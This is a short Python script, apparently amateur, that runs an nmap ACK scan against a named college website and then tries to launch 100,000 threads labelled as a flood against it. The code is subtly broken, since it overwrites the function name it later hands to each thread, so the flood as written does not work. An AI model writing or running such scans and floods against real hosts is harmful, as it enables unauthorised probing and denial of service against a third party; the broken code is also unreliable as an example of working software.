import os
import socket
import threading
import sys
import time
import subprocess

def attack(target, arg):
    host = socket.gethostbyname(target)
    attack = os.system(f"nmap {host} {arg}")
    threads = []
    for i in range(100000):
        thread = threading.Thread(target=attack, args=(i,), name=f"flooded {i}")
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

target = "www.brcmcet.edu.in"
arg = "-sA"

attack(target, arg)
